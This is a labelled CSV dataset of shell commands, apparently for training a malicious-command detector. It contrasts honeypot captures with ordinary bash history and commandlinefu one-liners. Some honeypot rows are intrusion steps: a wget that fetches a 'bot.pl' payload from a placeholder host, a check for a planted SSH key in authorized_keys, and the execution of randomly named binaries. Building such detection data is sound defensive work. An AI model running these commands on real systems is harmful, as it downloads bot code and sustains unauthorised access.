id,command,label,source,split
d2_000002,[goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ bash: bbash:: command not found,0,bash_history,train
d2_000003,./qJWIJu99,1,honeypot,train
d2_000004,rosrun cloud_sim local_sim_executor.py,0,bash_history,train
d2_000005,OS=$(lsb_release -si),1,honeypot,train
d2_000006,"speakwhenup() { [ ""$1"" ] && PHOST=""$1"" || return 1; until ping -c1 -W2 $PHOST >/dev/null 2>&1; do sleep 5s; done; espeak ""$PHOST is up"" >/dev/null 2>&1; }",0,commandlinefu,train
d2_000007,"echo 'graph{node[shape=record];rankdir=LR;matrix[label=""{1|2|3}|{4|5|6}|{7|8|9}"",color=red]}' | dot -Tpng | display",0,commandlinefu,train
d2_000008,"LC_ALL=C grep ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuhPmv3xdhU7JbMoc/ecBTDxiGqFNKbe564p4aNT6JbYWjNwZ5z6E4iQQDQ0bEp7uBtB0aut0apqDF/SL7pN5ybh2X44aCwDaSEB6bJuJi0yMkZwIvenmtCA1LMAr2XifvGS/Ulac7Qh5vFzfw562cWC+IOI+LyQZAcPgr+CXphJhm8QQ+O454ItXurQX6oPlA2rNfF36fnxYss1ZvUYC80wWTi9k2+/XR3IoQXZHKCFsJiwyKO2CY+jShBbDBbtdOX3/ksHNVNStA/jPE0HYD7u6V2Efjv9K+AEbklMsytD9T60Iu3ua+ugBrP5hL7zAjPHpXH8qW4Ku7dySZ4yvH"" ~/.ssh/authorized_keys",1,honeypot,train
d2_000009,"alias irssi=""screen -wipe; screen -A -U -x -R -S irssi irssi""",0,commandlinefu,train
d2_000011,bash -c ./hbhWYIpE,1,honeypot,train
d2_000012,wget https://hcbde1f0b.example.net/srKAe/bot.pl,1,honeypot,train
d2_000013,j --help,0,bash_history,train
d2_000015,cat helen,0,bash_history,train
d2_000017,vmrun list,0,commandlinefu,train
d2_000018,perl ./256colors2.pl,0,bash_history,train
d2_000019,./ps23e,1,honeypot,train
d2_000020,vim /home/aca08tog/.vim,0,bash_history,train
